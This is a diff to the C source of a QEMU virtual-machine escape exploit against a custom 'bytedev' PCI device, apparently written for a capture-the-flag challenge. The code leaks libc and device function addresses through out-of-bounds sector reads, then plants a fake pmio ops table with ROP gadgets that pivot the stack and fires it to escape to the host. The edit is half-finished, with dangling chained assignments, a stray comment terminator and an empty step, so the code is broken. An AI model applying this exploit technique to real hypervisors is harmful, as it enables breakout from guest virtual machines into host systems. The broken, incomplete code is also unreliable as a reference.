@@ -223,7 +223,7 @@ void qemuEscape(void)
 {
     int dev_fd, ret;
     uint64_t buf[BYTEDEV_SECTOR_SIZE / sizeof(uint64_t)];
-    uint64_t libc_base, opaque;
+    uint64_t libc_base, opaque, byte_dev_pmio_read;
 
     if ((dev_fd = open("/dev/bytedev", O_RDWR)) < 0) {
         errExit("failed to open bytedev!");
@@ -251,11 +251,11 @@ void qemuEscape(void)
      */
 
     /**
-     * Step.I leak libc base from pmio->container
+     * Step.I leak basic info
      */
 
     puts("");
-    puts("\033[34m\033[1m[*] Step.I leak libc base\033[0m");
+    puts("\033[34m\033[1m[*] Step.I leak basic\033[0m");
 
     puts("\033[34m\033[1m[*] Reading from -23 sector...\033[0m");
 
@@ -275,6 +275,14 @@ void qemuEscape(void)
     printf("\033[32m\033[1m[+] Got g_str_hash ptr: \033[0m%llx\n", buf[54]);
     printf("\033[32m\033[1m[+] Got libc_base: \033[0m%llx\n", libc_base);
 
+    puts("\033[34m\033[1m[*] Reading from -25 sector...\033[0m");
+
+    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -25);
+    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);
+    byte_dev_pmio_read = buf[0];
+    printf("\033[32m\033[1m[+] Got byte_dev_pmio_read: \033[0m%llx\n", 
+            byte_dev_pmio_read);
+
     /**
      * Step.II construct fake pmio->ops
      * There we make the opaque.parent_obj.name the ops,
@@ -285,18 +293,39 @@ void qemuEscape(void)
     puts("\033[34m\033[1m[*] Step.II construct fake pmio->ops\033[0m");
     
     ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -24);
-    read(dev_fd, buf, 27 * sizeof(uint64_t));
+    read(dev_fd, buf, 35 * sizeof(uint64_t));
     /**
      * mov rdx, qword ptr [rdi + 8] ; -> store the ptr in opaque[1]
      * mov qword ptr [rsp], rax ; 
      * call qword ptr [rdx + 0x20]  -> another call
      */
-    buf[30] = 
+    buf[27] = byte_dev_pmio_read;
+    buf[28] = 
         libc_base + LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20;
-    write(dev_fd, buf, 31 * sizeof(uint64_t));
+
+    /* the new rdx starts there */
+    buf[29] = 
+    buf[30] = 
+    buf[31] = 
+    buf[32] = 
+    /**
+     * [rdx + 20]
+     * mov rsp, rdx ; ret
+     */
+    */
+    buf[33] = libc_base + LIBC_MOV_RSP_RDX_RET;
 
     /**
-     * Step.III change pmio->ops to fake ops on opaque
+     * Step.III 
+     * 
+     */
+
+
+    buf[1] = opaque + 29 * 8;
+    write(dev_fd, buf, 35 * sizeof(uint64_t));
+
+    /**
+     * Step.IV change pmio->ops to fake ops on opaque
      */
 
     puts("");
@@ -307,24 +336,19 @@ void qemuEscape(void)
     opaque = buf[4];
     printf("\033[32m\033[1m[+] Got opaque: \033[0m%llx\n", opaque);
 
-    buf[9] = opaque + 30 * 8;
+    buf[9] = opaque + 27 * 8;
     write(dev_fd, buf, 10 * sizeof(uint64_t));
 
     /**
-     * Step.IV trigger fake pmio->ops.read to escape
+     * Step.V trigger fake pmio->ops.read to escape
      * There we need to set opaque[1] to opaque.parent_obj.name
      * and do something wonderful there...
      */
 
     puts("");
-    puts("\033[34m\033[1m[*] Step.IV trigger fake ops to escape\033[0m");
+    puts("\033[34m\033[1m[*] Step.V trigger fake ops to escape\033[0m");
 
-    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -24);
-    read(dev_fd, buf, 9 * sizeof(uint64_t));
-    buf[1] = 0xdeadbeef;
-    write(dev_fd, buf, 9 * sizeof(uint64_t));
-
-    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, *(size_t*)"arttnba3");
+    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, *(size_t*)"arttnba3");
 }
 
 void getRootShell(void)
